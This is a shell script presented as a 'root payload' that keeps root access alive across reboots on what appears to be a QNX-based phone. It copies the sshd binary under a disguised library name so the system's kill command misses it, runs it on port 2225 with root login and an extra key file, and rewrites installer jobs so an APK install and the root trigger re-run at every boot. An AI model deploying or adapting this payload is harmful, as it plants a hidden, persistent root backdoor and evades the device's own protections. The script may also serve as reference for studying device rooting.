#!/bin/sh
# q20 root payload v7: self-healing boot persistence.
# Runs as root via the switchzone trigger (carrier = ls-oom-adj.sh).
# Each run: kill-proof sshd (trusted inode, renamed), re-arms the three
# persisted installer jobs fresh for the next boot, rebuilds the unpack
# tree for the next boot's install job.
{
  echo "== q20 payload v7 running =="

  # 1. kill-proof root sshd: sshd binary in the TRUSTED inode (process name
  #    "fs-exfat.so" - immune to the system's `slay sshd`)
  SZ=`ls -l /var/exfat/fs-exfat.so 2>/dev/null | awk '{print $5}'`
  if [ -f /var/exfat/fs-exfat.so ] && [ "$SZ" -lt 100000 ]; then
    cp /usr/sbin/sshd /var/exfat/fs-exfat.so
    chmod 755 /var/exfat/fs-exfat.so
  fi
  mkdir -p /root/.ssh
  chmod 700 /root/.ssh
  chmod 600 /root/.ssh/authorized_keys
  slay -f sshd 2>/dev/null
  slay -f fs-exfat.so 2>/dev/null
  sleep 1
  /var/exfat/fs-exfat.so -p 2225 \
    -o PermitRootLogin=yes -o AllowUsers=root \
    -o AuthorizedKeysFile="/root/.ssh/authorized_keys /accounts/devuser/.ssh/authorized_keys2" \
    -o HostKey=/etc/ssh/ssh_host_rsa_key \
    -o PasswordAuthentication=no -o Protocol=2 -o StrictModes=no
  echo "renamed sshd 2225 rc=$?"

  # 2. self-heal: rebuild the unpack tree for the NEXT boot's install job
  #    (deckard consumes /var/android/q20final each time it installs)
  rm -rf /var/android/q20final
  if [ -d /accounts/devuser/q20final_dir ]; then
    cp -R /accounts/devuser/q20final_dir /var/android/q20final
    chmod -R a+rX /var/android/q20final
  fi

  # 3. self-heal: re-arm the persisted jobs fresh (no results -> deckard
  #    re-processes them at every boot). Two sz jobs cover the boot-time
  #    session race (active session is 0 early in boot, 1 later).
  P=/var/pps/system@0.0.775/installer@88.88.755/upd@88.88.755/current@88.88.2775
  cat > "$P/job.q20final@0.88.664" <<EOF
action::install_apk
package_location::/var/android/q20final
extras::source::apk
EOF
  cat > "$P/job.q20sz0@0.88.664" <<EOF
@sz
action::switchzone
session::0
zone:json:{"radio":"true","os":"true"}
EOF
  cat > "$P/job.q20sz1@0.88.664" <<EOF
@sz
action::switchzone
session::1
zone:json:{"radio":"true","os":"true"}
EOF
  chown pps:pps "$P"/job.q20* 2>/dev/null
  chmod 664 "$P"/job.q20* 2>/dev/null
  rm -f /pps/system/installer/upd/current/job.q20sz0 /pps/system/installer/upd/current/job.q20sz1 2>/dev/null

  echo done > /tmp/q20-rooted
  echo "== payload v7 finished =="
} > /tmp/q20-payload.log 2>&1
